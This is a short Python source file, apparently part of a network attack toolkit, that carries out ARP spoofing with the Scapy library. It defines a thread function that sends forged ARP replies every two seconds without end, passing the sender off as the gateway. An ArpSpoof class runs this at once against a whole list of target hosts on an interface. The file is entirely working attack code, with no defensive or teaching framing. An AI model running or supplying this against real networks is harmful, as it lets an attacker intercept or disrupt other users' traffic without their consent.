import threading
from ipaddress import IPv4Address

from scapy.config import conf
from scapy.layers.l2 import Ether, ARP
from scapy.sendrecv import send, sendp

from utils.object.host import Host
from utils.object.interfaces import Interface


def _arp_spoof_thread_(sender: Host, recipient: Host, interface: Interface, gateway: Host):
    sendp(Ether(dst=recipient.mac) / ARP(op=2, psrc=str(gateway.ip), pdst=str(recipient.ip),
                                         hwdst=recipient.mac, hwsrc=sender.mac), iface=interface.name,
          loop=1, inter=2)


class ArpSpoof:
    def __init__(self, hosts_list: list[Host], fake_sender: Host, interface: Interface, gateway: Host):
        self.hosts_list: list[Host] = hosts_list
        self.fake_sender: Host = fake_sender
        self.interface = interface
        self.gateway: Host = gateway

    def start(self):
        threads = []
        for host in self.hosts_list:
            threads.append(threading.Thread(target=_arp_spoof_thread_,
                                            args=(self.fake_sender, host, self.interface, self.gateway)))
        for thread in threads:
            thread.start()
        for thread in threads:
            thread.join()
